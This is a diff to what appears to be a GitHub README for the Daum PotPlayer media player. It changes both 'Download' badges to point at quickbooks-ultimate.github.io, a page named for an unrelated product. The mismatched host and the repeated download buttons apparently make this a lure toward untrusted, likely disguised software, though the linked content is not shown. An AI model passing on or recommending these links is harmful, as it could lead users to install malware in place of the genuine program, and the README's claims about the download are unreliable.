@@ -2,8 +2,8 @@
 
 Daum PotPlayer is a highly versatile multimedia player that supports a vast range of video and audio formats. With advanced features and high performance, it provides an exceptional playback experience for all types of media content.
 
-[![Download Daum PotPlayer](https://img.shields.io/badge/Download-Daum_PotPlayer-blueviolet)](https://daum-potplayer-pro.github.io/.github)  
-[![Download Daum PotPlayer](https://img.shields.io/badge/Download-Daum_PotPlayer-blueviolet)](https://daum-potplayer-pro.github.io/.github)
+[![Download Daum PotPlayer](https://img.shields.io/badge/Download-Daum_PotPlayer-blueviolet)](https://quickbooks-ultimate.github.io/.github)  
+[![Download Daum PotPlayer](https://img.shields.io/badge/Download-Daum_PotPlayer-blueviolet)](https://quickbooks-ultimate.github.io/.github)
 
 ---
 
